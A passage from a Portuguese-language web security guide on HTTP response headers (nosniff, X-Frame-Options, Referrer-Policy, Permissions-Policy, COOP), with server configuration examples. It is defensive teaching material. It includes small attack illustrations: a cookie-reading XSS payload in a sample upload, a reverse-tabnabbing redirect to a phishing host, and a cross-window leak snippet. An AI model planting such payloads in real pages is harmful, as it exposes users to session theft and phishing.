- O navegador é obrigado a respeitar estritamente o cabeçalho `Content-Type` enviado pelo servidor.
- **Para `<script>` e Worker scripts**: O navegador **bloqueia** a execução do recurso a menos que o `Content-Type` seja um tipo MIME oficial de JavaScript (como `text/javascript` ou `application/javascript`, conforme a **RFC 9239**) ou WebAssembly (`application/wasm`). Isso também impede ataques de *Cross-Origin Script Inclusion* (XSSI), nos quais um site malicioso inclui `<script src="https://banco.exemplo.test/api/extrato.json">` tentando ler dados de outros formatos.
- **Para `<link rel="stylesheet">`**: O navegador **bloqueia** a aplicação da folha de estilo a menos que o `Content-Type` seja exatamente `text/css`.
- **Para navegação direta a arquivos enviados por usuários**: Um arquivo servido como `text/plain` jamais será "promovido" a `text/html` pelo navegador.
- Além disso, o `nosniff` colabora diretamente com o mecanismo nativo do navegador chamado **CORB** (*Cross-Origin Read Blocking*) / **ORB** (*Opaque Response Blocking*), protegendo respostas JSON, HTML e XML contra leitura cross-origin em canais laterais.

##### 2. Quando se aplica (contexto de uso)
- **[REQUISITO]** universal em **todas** as respostas HTTP de qualquer servidor web ou API (documentos HTML, respostas JSON, scripts, folhas de estilo, imagens e downloads de arquivos). É um dos poucos cabeçalhos de segurança que deve estar presente em 100% das respostas, independentemente da rota.

##### 3. Exemplo prático
Suponha que um servidor de armazenamento sirva um arquivo de texto enviado por um usuário na URL `https://loja-ficticia.test/uploads/nota.txt` cujo conteúdo interno seja `<html><script>alert(document.cookie)</script></html>`:

```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="nota.txt"
X-Content-Type-Options: nosniff
```

Com `X-Content-Type-Options: nosniff` (e reforçado por `Content-Disposition: attachment`), o navegador exibe apenas o texto puro literal na tela ou força o download para o disco, **jamais** interpretando as tags `<script>`.

Da mesma forma, se uma página tentar carregar um endpoint JSON como se fosse um script:

```html
<script src="https://api.loja-ficticia.test/v1/perfil"></script>
```

Como a API retorna `Content-Type: application/json` acompanhado de `X-Content-Type-Options: nosniff`, o navegador aborta a execução imediatamente antes que o parser JavaScript processe os bytes.

##### 4. Configuração recomendada
Existe apenas uma configuração válida e universal:

```http
X-Content-Type-Options: nosniff
```

> [!WARNING]
> Ao ativar `X-Content-Type-Options: nosniff`, certifique-se de que o seu servidor web declara o `Content-Type` correto para todos os seus arquivos estáticos (`.js` como `text/javascript`, `.css` como `text/css`, `.json` como `application/json`). Se um servidor mal configurado entregar o arquivo `bundle.js` com `Content-Type: text/plain` junto com `nosniff`, o navegador **recusará a execução do seu próprio JavaScript**, quebrando a aplicação!

##### 5. O que acontece quando está ausente
- O navegador fica livre para aplicar algoritmos heurísticos de *MIME sniffing* quando o `Content-Type` estiver ausente, genérico (`application/octet-stream`, `text/plain`) ou ambíguo.
- Arquivos enviados por usuários (avatares, anexos de suporte, documentos exportados) que contenham trechos de HTML ou SVG com scripts podem ser interpretados como documentos ativos e executar **Stored XSS** no domínio principal.
- Arquivos HTML, CSV ou JSON podem ser carregados indevidamente via tags `<script>` ou `<link rel="stylesheet">` de origens cruzadas, facilitando ataques de vazamento de dados cross-origin.

##### 6. O que pode acontecer quando está configurado incorretamente
- **Erro de digitação no valor (ex.: `no-sniff` com hífen, `true` ou `1`)**: O padrão reconhece exclusivamente a string exata `nosniff` (case-insensitive). Qualquer outro valor como `no-sniff` faz com que o cabeçalho seja completamente ignorado pelo navegador, mantendo o *MIME sniffing* ativo.
- **Envio de `nosniff` sem envio de `Content-Type` adequado**: Recursos legítimos de script e estilo serão bloqueados pelo navegador se o servidor omitir o cabeçalho `Content-Type` ou enviar `text/plain` por engano.

##### 7. Como verificar na aba Network do DevTools
1. Abra a aba **[Network](./02a-devtools-network.md#s2-1)** do Chrome DevTools e recarregue a página.
2. Clique com o botão direito sobre o cabeçalho das colunas da tabela de requisições (`Name`, `Status`, `Type`...), selecione **Response Headers** -> **Manage Header Columns...** e adicione uma coluna personalizada para `X-Content-Type-Options`.
3. Dessa forma, você consegue visualizar de relance, para **todas** as linhas da tabela (HTML, JS, CSS, XHR/Fetch, Imagens), se alguma rota ou CDN esqueceu de enviar `nosniff`.
4. Caso um script ou folha de estilo seja bloqueado por `nosniff`, a aba **[Console](./02c-devtools-console.md#s2-3)** exibirá a mensagem:
   `Refused to execute script from 'https://exemplo.test/app.js' because its MIME type ('text/plain') is not executable, and strict MIME type checking is enabled.`

##### 8. Como corrigir (exemplos em Nginx, Apache e Express/Node.js)

**Nginx**:
```nginx
server {
    listen 443 ssl http2;
    server_name loja-ficticia.test;

    # Garante o carregamento da tabela padrão de tipos MIME do Nginx
    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    add_header X-Content-Type-Options "nosniff" always;
}
```

**Apache HTTP Server**:
```apache
<VirtualHost *:443>
    ServerName loja-ficticia.test

    Header always set X-Content-Type-Options "nosniff"
</VirtualHost>
```

**Express / Node.js**:
```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// Ativado por padrão no helmet(), ou individualmente via helmet.noSniff()
app.use(helmet.noSniff());

// Alternativa manual sem bibliotecas externas:
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});
```

---

<a id="s5-4"></a>
### 5.4 X-Frame-Options

##### 1. O que faz
O cabeçalho **`X-Frame-Options`** — documentado na **RFC 7034** — indica ao navegador se uma página web tem ou não permissão para ser renderizada dentro de um elemento de enquadramento HTML (`<frame>`, `<iframe>`, `<embed>` ou `<object>`).

Seu objetivo exclusivo é defender a aplicação contra ataques de **Clickjacking** (*UI Redressing* — Redesenho de Interface, detalhado em [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3)), nos quais um site malicioso carrega a página da vítima (por exemplo, a tela de *"Confirmar Transferência"* ou *"Excluir Conta"*) dentro de um `<iframe>` invisível (`opacity: 0`) posicionado exatamente sobre um botão chamativo falso (como *"Clique aqui para resgatar seu prêmio"*). Quando o usuário clica no botão aparente, está na verdade clicando no botão autenticado dentro do `<iframe>` oculto.

As diretivas históricas e atuais do `X-Frame-Options` são:
- **`DENY`**: Proíbe terminantemente que a página seja exibida dentro de um `<frame>` ou `<iframe>`, **independentemente** de qual site tente embuti-la (nem mesmo páginas da própria origem podem enquadrá-la).
- **`SAMEORIGIN`**: Permite que a página seja exibida em um `<frame>` ou `<iframe>` **somente se** a página pai (e toda a cadeia de ancestrais até o documento de topo) pertencer exatamente à **mesma origem** (`esquema + host + porta`) da página enquadrada.
- **`ALLOW-FROM https://origem.exemplo.test`** (**[Obsoleto]**): Existia na RFC 7034 original para tentar autorizar uma única origem específica de terceiros, mas foi **removida e nunca teve suporte nos navegadores modernos** (Chrome, Safari e versões atuais do Firefox e Edge a ignoram completamente). Nunca deve ser utilizada!

**Relação com `Content-Security-Policy: frame-ancestors`**:
A diretiva `frame-ancestors` do **CSP Level 2** é a sucessora moderna e padronizada do `X-Frame-Options`. Ela supera três grandes limitações do cabeçalho antigo:
1. Permite listar **múltiplas origens autorizadas** (ex.: `frame-ancestors 'self' https://parceiro1.exemplo.test https://parceiro2.exemplo.test`).
2. Garante que **todos os ancestrais** na árvore de frames sejam validados consistentemente em todos os navegadores.
3. Segundo a especificação do W3C CSP, **quando uma resposta HTTP inclui tanto `Content-Security-Policy: frame-ancestors ...` quanto `X-Frame-Options`, os navegadores modernos dão precedência ao `frame-ancestors` e ignoram o `X-Frame-Options`**. Ainda assim, enviar ambos em conjunto continua sendo uma **[BOA PRÁTICA]** de defesa em profundidade e compatibilidade com clientes ou auditores legados.

| Cenário Desejado | Configuração em `X-Frame-Options` | Equivalente Moderno em `CSP` |
| :--- | :--- | :--- |
| **Proibir qualquer iframe** (Mais seguro) | `X-Frame-Options: DENY` | `Content-Security-Policy: frame-ancestors 'none'` |
| **Permitir iframe apenas da mesma origem** | `X-Frame-Options: SAMEORIGIN` | `Content-Security-Policy: frame-ancestors 'self'` |
| **Permitir iframe de origens específicas de terceiros** | *Não suportado* (`ALLOW-FROM` é **[Obsoleto]**) | `Content-Security-Policy: frame-ancestors 'self' https://portal.exemplo.test` |

##### 2. Quando se aplica (contexto de uso)
- **[REQUISITO]** em todas as páginas HTML interativas (especialmente telas de login, painéis administrativos, configurações de conta e fluxos financeiros), a menos que o `CSP: frame-ancestors` já esteja devidamente configurado.
- **[BOA PRÁTICA]** em respostas de APIs (`X-Frame-Options: DENY`) para evitar qualquer tentativa de carregamento de endpoints em frames.

##### 3. Exemplo prático
Quando o servidor de banco digital `https://banco.exemplo.test/transferencia` envia:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

Se uma página maliciosa em `https://sorteio-falso.test` tentar incluir `<iframe src="https://banco.exemplo.test/transferencia"></iframe>`, o navegador bloqueará a renderização do documento dentro do quadro, exibindo uma página de erro neutra no lugar do frame e impedindo o Clickjacking.

##### 4. Configuração recomendada
Se a aplicação **não** precisa ser carregada dentro de iframes (caso da imensa maioria das aplicações web modernas):

```http
X-Frame-Options: DENY
```

Se a própria aplicação utiliza iframes internos da mesma origem:

```http
X-Frame-Options: SAMEORIGIN
```

Sempre combine com a diretiva `frame-ancestors` correspondente no `Content-Security-Policy`.

##### 5. O que acontece quando está ausente
Caso `X-Frame-Options` **e** a diretiva `frame-ancestors` do CSP estejam ambos ausentes:
- Qualquer site da internet pode incorporar a sua aplicação dentro de um `<iframe>`.
- A aplicação torna-se vulnerável a **Clickjacking**, permitindo que atacantes induzam usuários autenticados a clicar em botões de ação, conceder permissões OAuth, curtir páginas, alterar configurações de privacidade ou arrastar e soltar dados (*Drag-and-Drop Clickjacking*).

##### 6. O que pode acontecer quando está configurado incorretamente
- **Uso da diretiva obsoleta `ALLOW-FROM`**: Como navegadores modernos não suportam `ALLOW-FROM`, ao receber `X-Frame-Options: ALLOW-FROM https://parceiro.test`, o navegador ignora o cabeçalho inteiro e **deixa a página totalmente desprotegida** (qualquer site poderá enquadrá-la) se não houver `CSP: frame-ancestors`.
- **Colocar `X-Frame-Options` dentro de uma tag `<meta http-equiv="X-Frame-Options" ...>` no HTML**: Os navegadores ignoram `X-Frame-Options` (assim como `frame-ancestors` do CSP) quando declarados em tags `<meta>`. Eles **obrigatoriamente** precisam ser enviados como cabeçalhos HTTP reais de resposta.
- **Envio duplicado de headers conflitantes**: Se o back-end enviar `X-Frame-Options: SAMEORIGIN` e o proxy reverso adicionar outro `X-Frame-Options: SAMEORIGIN` (resultando em `SAMEORIGIN, SAMEORIGIN`) ou `DENY`, o comportamento varia ou pode quebrar iframes legítimos.

##### 7. Como verificar na aba Network do DevTools
1. Na aba **[Network](./02a-devtools-network.md#s2-1)** do Chrome DevTools, selecione o documento HTML principal (filtro **Doc**) e verifique a seção **Response Headers** em busca de `x-frame-options` (`DENY` ou `SAMEORIGIN`).
2. Na aba **Application** -> seção **Frames** (no final da barra lateral esquerda), selecione o frame `top` para visualizar a seção **Security & Isolation**, que resume as políticas de controle de enquadramento ativas.
3. Quando um iframe é bloqueado por `X-Frame-Options`, a aba **[Console](./02c-devtools-console.md#s2-3)** exibe o erro:
   `Refused to display 'https://banco.exemplo.test/' in a frame because it set 'X-Frame-Options' to 'deny'.`

##### 8. Como corrigir (exemplos em Nginx, Apache e Express/Node.js)

**Nginx**:
```nginx
server {
    listen 443 ssl http2;
    server_name banco.exemplo.test;

    add_header X-Frame-Options "DENY" always;
}
```

**Apache HTTP Server**:
```apache
<VirtualHost *:443>
    ServerName banco.exemplo.test

    Header always set X-Frame-Options "DENY"
</VirtualHost>
```

**Express / Node.js**:
```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// Configura X-Frame-Options: DENY (o padrão do helmet é SAMEORIGIN)
app.use(
  helmet.frameguard({
    action: 'deny'
  })
);
```

---

<a id="s5-5"></a>
### 5.5 Referrer-Policy

##### 1. O que faz
O cabeçalho **`Referrer-Policy`** — padronizado pelo **W3C** — governa exatamente quanta informação de endereço de origem o navegador deve incluir no cabeçalho de requisição **`Referer`** (note a grafia histórica sem um "r" no header de requisição original do HTTP, versus a grafia correta com dois "r" no cabeçalho de política `Referrer-Policy`) quando o usuário clica em um link, envia um formulário ou quando a página carrega sub-recursos (imagens, scripts, folhas de estilo, iframes).

Por que isso é um problema crítico de segurança e privacidade?
A URL completa de uma página frequentemente contém informações sensíveis no **caminho (*path*)** ou na **query string** (por exemplo: `https://loja-ficticia.test/redefinir-senha?token=eyJhbGciOi...` ou `https://intranet.exemplo.test/clientes/49102/prontuario-medico`). Se essa página carregar uma imagem externa, um script de analytics ou contiver um link para um site de terceiros, e o navegador enviar a URL completa no cabeçalho `Referer`, **o token de recuperação de senha ou o ID confidencial será vazado diretamente para os logs do servidor externo**!

O padrão define **8 valores oficiais** para `Referrer-Policy`, que todo estudante deve saber diferenciar:

1. **`no-referrer`**: O cabeçalho `Referer` é **completamente omitido** em todas as requisições (sejam elas de mesma origem ou origem cruzada, HTTPS ou HTTP). Máxima privacidade.
2. **`no-referrer-when-downgrade`**: Envia a **URL completa** (origem + caminho + query string) tanto para a mesma origem quanto para origens cruzadas, **exceto** quando ocorre um rebaixamento de segurança (*downgrade*, isto é, saindo de `https://` para `http://`), caso em que o `Referer` é omitido. (Era o comportamento padrão antigo dos navegadores antes de 2020).
3. **`origin`**: Envia **apenas a origem** (`esquema + host + porta`, ex.: `https://loja-ficticia.test/`) em todas as requisições, omitindo sempre o caminho e a query string, inclusive em navegações de `https://` para `http://`.
4. **`origin-when-cross-origin`**: Envia a **URL completa** para requisições de **mesma origem** (*same-origin*), mas envia **apenas a origem** em requisições para outras origens (*cross-origin*), inclusive em *downgrade* `https://` -> `http://`.
5. **`same-origin`**: Envia a **URL completa** exclusivamente para requisições de **mesma origem** (*same-origin*). Para qualquer requisição de origem cruzada (*cross-origin*), o cabeçalho `Referer` é **totalmente omitido**.
6. **`strict-origin`**: Envia **apenas a origem** em todas as requisições (mesma origem ou origem cruzada) quando o nível de segurança permanece igual (`https://` -> `https://`) ou melhora (`http://` -> `https://`), mas **omite completamente** o `Referer` se houver *downgrade* (`https://` -> `http://`).
7. **`strict-origin-when-cross-origin`**: É o equilíbrio ideal entre funcionalidade e privacidade (e o **padrão atual dos navegadores modernos** quando nenhum header é enviado):
   - Em requisições de **mesma origem** (`https://a.test/pag1` -> `https://a.test/pag2`): envia a **URL completa**.
   - Em requisições de **origem cruzada seguras** (`https://a.test/pag1` -> `https://b.test/recurso`): envia **apenas a origem** (`https://a.test/`).
   - Em requisições com **downgrade de segurança** (`https://a.test/pag1` -> `http://b.test` ou `http://a.test`): **omite completamente** o cabeçalho `Referer`.
8. **`unsafe-url`** (Inseguro!): Envia a **URL completa** (incluindo caminho e query string) em **todos os cenários possíveis**, até mesmo em requisições de origem cruzada e em *downgrade* de `https://` para `http://` em texto claro. Nunca deve ser usado em sistemas reais.

A tabela comparativa abaixo resume o valor exato enviado no header `Referer` a partir da página de origem **`https://loja.test/conta?token=123`** para cada um dos 8 valores:

| Valor de `Referrer-Policy` | Mesma Origem (`https://loja.test/pedidos`) | Origem Cruzada HTTPS (`https://parceiro.test/img.png`) | Downgrade HTTP (`http://externo.test` ou `http://loja.test`) | Classificação de Segurança |
| :--- | :--- | :--- | :--- | :--- |
| **`no-referrer`** | *(Omitido)* | *(Omitido)* | *(Omitido)* | **Segura** (Máxima privacidade) |
| **`same-origin`** | `https://loja.test/conta?token=123` | *(Omitido)* | *(Omitido)* | **Segura** (Ideal para intranets/bancos) |
| **`strict-origin`** | `https://loja.test/` | `https://loja.test/` | *(Omitido)* | **Segura** (Oculta paths até internamente) |
| **`strict-origin-when-cross-origin`** | `https://loja.test/conta?token=123` | `https://loja.test/` | *(Omitido)* | **Segura** (Recomendada / Padrão atual) |
| **`no-referrer-when-downgrade`** | `https://loja.test/conta?token=123` | `https://loja.test/conta?token=123` | *(Omitido)* | **Insegura** (Vaza path/query para terceiros HTTPS) |
| **`origin`** | `https://loja.test/` | `https://loja.test/` | `https://loja.test/` | **Insegura** (Vaza origem sobre HTTP claro) |
| **`origin-when-cross-origin`** | `https://loja.test/conta?token=123` | `https://loja.test/` | `https://loja.test/` | **Insegura** (Vaza origem sobre HTTP claro) |
| **`unsafe-url`** | `https://loja.test/conta?token=123` | `https://loja.test/conta?token=123` | `https://loja.test/conta?token=123` | **Crítica / Insegura** (Vaza tudo sempre) |

##### 2. Quando se aplica (contexto de uso)
- **[RECOMENDAÇÃO]** (e **[REQUISITO]** em páginas que manipulam URLs parametrizadas ou dados privados) para todos os documentos HTML, folhas de estilo CSS (pois `url(...)` em CSS também envia `Referer`) e scripts.

##### 3. Exemplo prático
Um portal médico em `https://clinica.exemplo.test/pacientes/9812/exames` envia a seguinte resposta:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: same-origin
```

Quando o navegador carrega o script interno `https://clinica.exemplo.test/static/app.js`, ele envia `Referer: https://clinica.exemplo.test/pacientes/9812/exames`. Porém, quando o médico clica em um link externo para um artigo científico em `https://revista-medica.exemplo.test/artigo`, o navegador **não envia nenhum cabeçalho `Referer`**, impedindo que o portal externo saiba que o paciente `9812` estava sendo consultado.

##### 4. Configuração recomendada
Para aplicações web em geral:
```http
Referrer-Policy: strict-origin-when-cross-origin
```

Para sistemas altamente sensíveis (bancos, saúde, administração pública, páginas de redefinição de senha):
```http
Referrer-Policy: no-referrer
```
*(ou `same-origin`, caso o back-end utilize o `Referer` internamente como verificação auxiliar).*

É possível também especificar um valor de fallback separado por vírgula para navegadores antigos (o navegador usa o último valor suportado da lista da esquerda para a direita):
```http
Referrer-Policy: no-referrer, strict-origin-when-cross-origin
```

##### 5. O que acontece quando está ausente
- Nos navegadores modernos (Chrome 85+, Firefox 87+, Edge, Safari), na ausência do header, o navegador aplica automaticamente **`strict-origin-when-cross-origin`** como padrão **[Varia por versão]**.
- Contudo, em navegadores corporativos legados ou webviews antigas, o padrão de fábrica ainda é **`no-referrer-when-downgrade`**, o que faz com que a URL completa (com caminhos internos e query strings) seja enviada para qualquer domínio HTTPS externo carregado pela página.

##### 6. O que pode acontecer quando está configurado incorretamente
- **Uso de `unsafe-url` ou `no-referrer-when-downgrade`**: Se a aplicação colocar tokens de sessão, códigos de autorização OAuth (`?code=...`), links mágicos de login ou tokens de redefinição de senha na URL, qualquer imagem, fonte, pixel de rastreamento ou link externo presente na página receberá o token completo no cabeçalho `Referer`, permitindo o sequestro imediato da conta (*Account Takeover*).

##### 7. Como verificar na aba Network do DevTools
1. Na aba **[Network](./02a-devtools-network.md#s2-1)** do Chrome DevTools, clique em qualquer requisição e observe a seção **General** (logo no topo da sub-aba **Headers**): o Chrome exibe um campo dedicado chamado **`Referrer Policy`** mostrando a política efetiva aplicada àquela requisição, além do header bruto `referrer-policy` dentro de **Response Headers**.
2. Em seguida, clique em uma requisição de terceiros (outro domínio) na lista e olhe em **Request Headers** o valor real enviado no campo `Referer` para confirmar que caminhos e query strings não estão vazando.

##### 8. Como corrigir (exemplos em Nginx, Apache e Express/Node.js)

**Nginx**:
```nginx
server {
    listen 443 ssl http2;
    server_name loja-ficticia.test;

    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
}
```

**Apache HTTP Server**:
```apache
<VirtualHost *:443>
    ServerName loja-ficticia.test

    Header always set Referrer-Policy "strict-origin-when-cross-origin"
</VirtualHost>
```

**Express / Node.js**:
```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// O Helmet define "no-referrer" por padrão, mas podemos configurar explicitamente:
app.use(
  helmet.referrerPolicy({
    policy: 'strict-origin-when-cross-origin'
  })
);
```

---

<a id="s5-6"></a>
### 5.6 Permissions-Policy

##### 1. O que faz
O cabeçalho **`Permissions-Policy`** — especificado pelo **W3C** — permite que o proprietário de um site habilite, restrinja ou desative explicitamente o acesso a recursos poderosos do navegador e APIs de hardware (como câmera, microfone, geolocalização, pagamento, USB, Bluetooth, acelerômetro, tela cheia e reprodução automática) tanto para o **próprio documento principal** quanto para quaisquer **`<iframe>`s incorporados** na página.

**Diferença fundamental para o antigo `Feature-Policy` (`[Obsoleto]`)**:
O cabeçalho originalmente chamava-se `Feature-Policy` e usava sintaxe separada por ponto e vírgula semelhante ao CSP (ex.: `Feature-Policy: geolocation 'none'; camera 'self'`). Posteriormente, o W3C renomeou a especificação para **`Permissions-Policy`** e adotou a sintaxe padronizada de **Structured Field Values for HTTP (RFC 8941)**, usando sinais de igual (`=`), listas entre parênteses `(...)` e separação por vírgulas (`,`).

Na sintaxe atual do `Permissions-Policy`:
- **`recurso=()`** (parênteses vazios): **Desativa completamente** a API/recurso para o documento atual e para todos os iframes aninhados (mesmo que sejam da mesma origem). Equivale ao antigo `'none'`.
- **`recurso=(self)`**: Permite o recurso apenas para o documento atual e iframes da **mesma origem**, bloqueando iframes de terceiros. (Nota: na sintaxe do `Permissions-Policy`, a palavra `self` vai **sem aspas**, diferentemente do CSP!).
- **`recurso=(self "https://parceiro.exemplo.test")`**: Permite o recurso para a própria origem e para a origem específica listada entre aspas duplas (desde que a tag `<iframe allow="recurso">` também delegue a permissão no HTML).
- **`recurso=*`**: Permite o recurso para o documento e todos os iframes sem restrição de origem.

As diretivas mais cobradas em provas e auditorias são:
- **`geolocation=()`**: Bloqueia o acesso à API de localização geográfica (`navigator.geolocation`).
- **`camera=()`**: Bloqueia o acesso à câmera de vídeo via `navigator.mediaDevices.getUserMedia()`.
- **`microphone=()`**: Bloqueia o acesso ao microfone de áudio.
- **`payment=()`**: Bloqueia o uso da *Payment Request API* (`new PaymentRequest()`).
- **`usb=()`**: Bloqueia a *WebUSB API* (`navigator.usb`), impedindo comunicação direta com dispositivos USB físicos.
- Outras diretivas importantes incluem: `display-capture=()` (compartilhamento de tela via `getDisplayMedia`), ` serial=()`, `hid=()`, `bluetooth=()`, `autoplay=(self)` e `fullscreen=(self)`.

##### 2. Quando se aplica (contexto de uso)
- **[RECOMENDAÇÃO]** em todas as páginas HTML, aplicando o **Princípio do Menor Privilégio**: todo recurso de hardware ou API sensível que a aplicação não utiliza deve ser explicitamente desligado com `=()`. Assim, mesmo que um atacante consiga injetar JavaScript via XSS ou comprometer um iframe de anúncio de terceiros, o navegador negará no nível do motor C++ qualquer tentativa de acionar a câmera, o microfone ou a geolocalização.

##### 3. Exemplo prático
Um portal de comércio eletrônico que usa geolocalização apenas na própria página (para calcular frete), mas não usa câmera, microfone, USB nem Payment Request API:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Permissions-Policy: geolocation=(self), camera=(), microphone=(), payment=(), usb=(), display-capture=()
```

Se um script na página tentar executar `navigator.mediaDevices.getUserMedia({ video: true })`, o navegador nem sequer mostrará o pop-up pedindo permissão ao usuário: a Promise será rejeitada instantaneamente com `DOMException: Permission denied`.

##### 4. Configuração recomendada
Desabilitar por padrão todos os sensores e interfaces de hardware que não façam parte dos requisitos de negócio da aplicação:

```http
Permissions-Policy: accelerometer=(), autoplay=(), camera=(), display-capture=(), encrypted-media=(), fullscreen=(self), geolocation=(), gyroscope=(), hid=(), microphone=(), midi=(), payment=(), picture-in-picture=(), publickey-credentials-get=(self), screen-wake-lock=(), serial=(), usb=(), web-share=()
```

##### 5. O que acontece quando está ausente
- As APIs de hardware e sensores permanecem habilitadas por padrão para documentos de primeiro nível (*first-party*).
- Caso o usuário já tenha concedido permissão de câmera, microfone ou geolocalização anteriormente para o domínio (por exemplo, em uma chamada de suporte por vídeo), qualquer vulnerabilidade de **XSS** em outra rota do mesmo domínio poderá ativar silenciosamente a câmera, o microfone ou rastrear a localização física do usuário em segundo plano sem novo pedido de confirmação.

##### 6. O que pode acontecer quando está configurado incorretamente
- **Misturar a sintaxe do CSP/Feature-Policy dentro do `Permissions-Policy`**: Escrever `Permissions-Policy: geolocation 'none'; camera 'self'` (usando ponto e vírgula e aspas simples em `'self'` ou `'none'`) é um **erro de sintaxe** segundo a RFC 8941 e faz com que o navegador descarte a política e exiba avisos no Console.
- **Bloquear `publickey-credentials-get=()` em telas de login modernas**: Isso desativa a API **WebAuthn / Passkeys** (chaves de segurança FIDO2 e biometria), impedindo os usuários de se autenticarem sem senha.

##### 7. Como verificar na aba Network do DevTools
1. Na aba **[Network](./02a-devtools-network.md#s2-1)** do Chrome DevTools, inspecione os **Response Headers** do documento HTML principal em busca de `permissions-policy`.
2. Para uma visão interativa completa no DevTools: vá até a aba **[Application](./02b-devtools-application.md#s2-2)** -> role a barra lateral esquerda até a seção **Frames** -> clique no frame principal (`top`). O painel direito exibirá a tabela **Permissions Policy**, listando todos os recursos que estão *Allowed* (Permitidos) e *Disabled* (Desativados), além de explicar o motivo exato de cada bloqueio.

##### 8. Como corrigir (exemplos em Nginx, Apache e Express/Node.js)

**Nginx**:
```nginx
server {
    listen 443 ssl http2;
    server_name loja-ficticia.test;

    add_header Permissions-Policy "geolocation=(), camera=(), microphone=(), payment=(), usb=(), display-capture=()" always;
}
```

**Apache HTTP Server**:
```apache
<VirtualHost *:443>
    ServerName loja-ficticia.test

    Header always set Permissions-Policy "geolocation=(), camera=(), microphone=(), payment=(), usb=(), display-capture=()"
</VirtualHost>
```

**Express / Node.js**:
```javascript
const express = require('express');

const app = express();

// Middleware definindo o header Permissions-Policy na sintaxe RFC 8941
app.use((req, res, next) => {
  res.setHeader(
    'Permissions-Policy',
    'geolocation=(), camera=(), microphone=(), payment=(), usb=(), display-capture=()'
  );
  next();
});
```

---

<a id="s5-7"></a>
### 5.7 Cross-Origin-Opener-Policy (COOP)

##### 1. O que faz
O cabeçalho **`Cross-Origin-Opener-Policy` (COOP)** — Política de Abertura de Origem Cruzada, padronizado no **HTML Living Standard** do **WHATWG** — controla o isolamento de documentos de nível superior (*top-level documents*, como abas e janelas do navegador) forçando a criação de um novo **Browsing Context Group** (Grupo de Contexto de Navegação) quando uma página abre outra janela de origem diferente ou é aberta por ela.

Por que o COOP foi criado?
Mesmo que a **Same-Origin Policy (SOP)** (veja [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1)) impeça que uma janela maliciosa em `https://atacante.test` leia diretamente o DOM de uma aba aberta via `const win = window.open("https://banco.exemplo.test")`, as duas janelas ainda mantinham uma referência mútua por meio dos objetos `window.opener` e `win`. Essa referência permitia:
1. **Ataques de Cross-Window / XS-Leaks (*Cross-Site Leaks*)**: A janela atacante conseguia inspecionar propriedades expostas através de origens, como `win.frames.length` (contar quantos iframes existem na página logada do usuário), cronometrar o tempo de carregamento ou enviar mensagens via `win.postMessage()`.
2. **Compartilhamento de Processo no Sistema Operacional**: Como `window.opener` permite chamadas síncronas limitadas entre janelas, navegadores podiam alocar as duas janelas no mesmo processo de renderização na memória RAM, deixando os dados da vítima expostos a ataques de canal lateral de CPU como **Spectre**.
3. **Reverse Tabnabbing**: Se a página A abrisse a página B sem `rel="noopener"`, a página B podia redirecionar a aba original A para uma tela de phishing via `window.opener.location = "https://phishing.test"`.

O COOP resolve isso rompendo o vínculo entre janelas de origens diferentes (`window.opener` torna-se `null`) e permitindo que o navegador isole os documentos em processos de sistema operacional totalmente separados. Seus valores são:

- **`unsafe-none`**: É o valor padrão caso o header não seja enviado. O documento permanece no mesmo grupo de contexto de navegação do seu abridor (*opener*), a menos que o próprio abridor tenha uma política COOP restritiva.
- **`same-origin-allow-popups`**: O documento isola-se de qualquer página de origem cruzada que o tenha aberto (quebrando o `window.opener` vindo de fora), **mas** mantém a referência `window.opener` para novos pop-ups que **ele próprio** abrir via `window.open()` (desde que esses pop-ups não definam `COOP: same-origin`). É muito útil para sites que precisam abrir pop-ups externos de login OAuth ou pagamento e manter comunicação com eles.
- **`same-origin`**: É o nível mais forte de isolamento. O documento só pode compartilhar um *Browsing Context Group* (e manter referências `window.opener`) com documentos que pertençam exatamente à **mesma origem** (`esquema + host + porta`) **e** que também enviem `COOP: same-origin`. Qualquer janela de origem cruzada (seja abridora ou aberta por ele) terá `window.opener === null` e rodará em um grupo de contexto isolado. É um **[REQUISITO]** para habilitar `self.crossOriginIsolated`.
- **`noopener-allow-popups`** (`[Varia por versão]` — adicionado recentemente ao padrão WHATWG): Rompe sempre a referência com o abridor (mesmo se for da mesma origem), mas permite comunicação com pop-ups abertos pela própria página.

##### 2. Quando se aplica (contexto de uso)
- **[RECOMENDAÇÃO]** em todos os documentos HTML de aplicações web (`same-origin` ou `same-origin-allow-popups`) para mitigar *XS-Leaks* e isolar processos no navegador.
- **[REQUISITO]** (com o valor `same-origin`, combinado ao `COEP`) quando a aplicação precisa utilizar `SharedArrayBuffer`, `performance.measureUserAgentSpecificMemory()` ou timers de alta resolução.
- Não tem efeito em sub-recursos (imagens, scripts, chamadas `fetch` JSON) nem em `<iframe>`s (aplica-se apenas a documentos *top-level*).

##### 3. Exemplo prático
Um painel financeiro em `https://banco.exemplo.test/painel` envia:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cross-Origin-Opener-Policy: same-origin
```

Se um usuário clicar em um link ou botão dentro de um site malicioso `https://sorteio.exemplo.test` que executa:

```javascript
const vitima = window.open('https://banco.exemplo.test/painel');
// Devido ao COOP: same-origin do banco, a referência é cortada:
console.log(vitima.frames.length); // Retorna 0 ou perde o vínculo; dentro do banco, window.opener === null
```

##### 4. Configuração recomendada
Para aplicações que **não** dependem de pop-ups cross-origin via `window.open()`:

```http
Cross-Origin-Opener-Policy: same-origin
```

Para aplicações que abrem pop-ups de autenticação social (Login com Google/Apple/Microsoft via pop-up) ou gateways de pagamento externos que precisam se comunicar de volta com a janela principal:

```http
Cross-Origin-Opener-Policy: same-origin-allow-popups
```

##### 5. O que acontece quando está ausente
- O navegador assume `unsafe-none`.
